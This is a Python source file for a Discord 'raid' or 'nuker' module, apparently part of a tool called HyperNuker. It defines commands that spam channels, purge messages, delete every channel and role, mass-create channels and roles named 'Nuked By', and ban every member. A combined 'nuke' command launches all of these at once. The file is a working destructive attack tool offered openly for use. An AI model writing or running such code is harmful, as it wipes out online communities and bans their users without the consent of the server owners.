# By Snu
# The creator is not responsible for misuse

"""MIT License

Copyright (c) 2022 Snu

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE."""

from asyncio import get_running_loop
from discord.ext import commands
from colorama import Fore, Style
from random import choice
from json import loads
from datetime import datetime

with open("files/config.json") as file:
    content = loads(file.read())

class Raid(commands.Cog):

    def __init__(self, client):
        self.client = client
        self.time = lambda: datetime.now().strftime('%H:%M:%S')
        self.nomes = content["nomes"] if content["nomes"] != [] else [""]

    
    @commands.command(aliases=content["spam"][1:])
    async def spam(self, ctx, repeat:int, *, msg):
        cmd = ctx.invoked_with.lower()
        count = 0

        for i in range(repeat):
            try:
                await ctx.channel.send(content=msg)
                print(f"{Fore.YELLOW}[{cmd.upper()}] Mensagem enviada com sucesso "
                    f"no canal -> {ctx.channel.id} - {self.time()}{Style.RESET_ALL}")
                count += 1

            except: print(f"{Fore.RED}[{cmd.upper()}] Erro ao enviar a mensagem "
                        f"no canal -> {ctx.channel.id} - {self.time()}{Style.RESET_ALL}")

        print(f"{Fore.YELLOW}[{cmd.upper()}] {count} Mensagem(ns) enviada(s) com sucesso - {self.time()}{Style.RESET_ALL}")

    
    @commands.command(aliases=content["purge"][1:])
    async def purge(self, ctx, limit:int=100):
        cmd = ctx.invoked_with.lower()
        count = count_error = 0

        async for message in ctx.channel.history(limit=limit):
            try:
                await message.delete()
                print(f"{Fore.YELLOW}[{cmd.upper()}] Mensagem -> {message.id} deletada - {self.time()}{Style.RESET_ALL}")
                count += 1

            except:
                print(f"{Fore.RED}[{cmd.upper()}] Não foi possível apagar a mensagem -> {message.id} - {self.time()}{Style.RESET_ALL}")
                count_error += 1

        print(f"{Fore.YELLOW}[{cmd.upper()}] {count} Mensagem(ns) apagada(s) com sucesso - {self.time()}{Style.RESET_ALL}")
        print(f"{Fore.RED}[{cmd.upper()}] {count} Mensagem(ns) não foram apagada(s) com sucesso - {self.time()}{Style.RESET_ALL}")


    @commands.command(aliases=content["create_channels"][1:])
    @commands.has_permissions(manage_channels=True)
    async def create_channels(self, ctx, limit:int=100):
        cmd = ctx.invoked_with.lower()
        count = 0

        for i in range(limit):
            nome = choice(self.nomes)

            if nome == "":
                nome = choice([f"Nuked By {self.client.user.name}", "Nuked with HyperNuker"])

            try:
                await ctx.guild.create_text_channel(nome)
                print(f"{Fore.YELLOW}[{cmd.upper()}] Um canal foi criado com sucesso - {self.time()}{Style.RESET_ALL}")
                count += 1

            except: print(f"{Fore.RED}[{cmd.upper()}] Erro ao criar um canal - {self.time()}{Style.RESET_ALL}")

        print(f"{Fore.YELLOW}[{cmd.upper()}] {count} Canais foram criado com sucesso - {self.time()}{Style.RESET_ALL}")


    @commands.command(aliases=content["delete_channels"][1:])
    @commands.has_permissions(manage_channels=True)
    async def delete_channels(self, ctx):
        cmd = ctx.invoked_with.lower()
        count = 0
        channels = ctx.guild.channels
        
        for channel in channels:
            try:
                await channel.delete()
                print(f"{Fore.YELLOW}[{cmd.upper()}] Um canal foi excluído com sucesso - {self.time()}{Style.RESET_ALL}")
                count += 1

            except: print(f"{Fore.RED}[{cmd.upper()}] Erro ao excluir um canal - {self.time()}{Style.RESET_ALL}")        
        
        print(f"{Fore.YELLOW}[{cmd.upper()}] {count} Canal(is) deletado(s) com sucesso - {self.time()}{Style.RESET_ALL}")

    
    @commands.command(aliases=content["create_roles"][1:])
    @commands.has_permissions(manage_roles=True)
    async def create_roles(self, ctx, limit:int=50):
        cmd = ctx.invoked_with.lower()
        count = 0

        for i in range(limit):
            nome = choice(self.nomes)
            if nome == "":
                nome = choice([f"Nuked By {self.client.user.name}", "Nuked with HyperNuker"])

            try:
                await ctx.guild.create_role(name=nome)
                print(f"{Fore.YELLOW}[{cmd.upper()}] Um cargo foi criado com sucesso - {self.time()}{Style.RESET_ALL}")
                count += 1

            except: print(f"{Fore.RED}[{cmd.upper()}] Erro ao criar um cargo - {self.time()}{Style.RESET_ALL}")
            
        print(f"{Fore.YELLOW}[{cmd.upper()}] {count} Cargo(s) criados(s) com sucesso - {self.time()}{Style.RESET_ALL}")


    @commands.command(aliases=content["delete_roles"][1:])
    @commands.has_permissions(manage_roles=True)
    async def delete_roles(self, ctx):
        cmd = ctx.invoked_with.lower()
        count = 0
        roles = ctx.guild.roles

        for role in roles:
            try:
                await role.delete()
                print(f"{Fore.YELLOW}[{cmd.upper()}] Um cargo foi excluído com sucesso - {self.time()}{Style.RESET_ALL}")
                count += 1

            except: print(f"{Fore.RED}[{cmd.upper()}] Erro ao excluir um cargo - {self.time()}{Style.RESET_ALL}")

        print(f"{Fore.YELLOW}[{cmd.upper()}] {count} Cargo(s) excluído(s) com sucesso - {self.time()}{Style.RESET_ALL}")


    @commands.command(aliases=content["ban_all"][1:])
    @commands.has_permissions(ban_members=True)
    async def ban_all(self, ctx):
        cmd = ctx.invoked_with.lower()

        print(f"{Fore.YELLOW}[{cmd.upper()}] Buscando membros no servidor - {self.time()}{Style.RESET_ALL}")
        await ctx.guild.subscribe(delay=1.5)
        print(f"{Fore.YELLOW}[{cmd.upper()}] Busca concluída... iniciando banimento - {self.time()}{Style.RESET_ALL}")
        count = 0
        for member in ctx.guild.members:
            try:
                await member.ban()
                print(f"{Fore.YELLOW}[{cmd.upper()}] O membro {member.name} foi banido com sucesso - {self.time()}{Style.RESET_ALL}")
                count += 1

            except: print(f"{Fore.RED}[{cmd.upper()}] Erro ao banir o membro {member.name} - {self.time()}{Style.RESET_ALL}")

        print(f"{Fore.YELLOW}[{cmd.upper()}] {count} Membro(s) banido(s) com sucesso - {self.time()}{Style.RESET_ALL}")


    @commands.command(aliases=content["nuke"][1:])
    @commands.has_permissions(manage_channels=True, manage_roles=True, ban_members=True)
    async def nuke(self, ctx):
        cmd = ctx.invoked_with.lower()

        loop = get_running_loop()
        loop.create_task(self.ban_all(ctx))
        loop.create_task(self.delete_channels(ctx))
        loop.create_task(self.delete_roles(ctx))
        loop.create_task(self.create_channels(ctx))
        loop.create_task(self.create_roles(ctx))
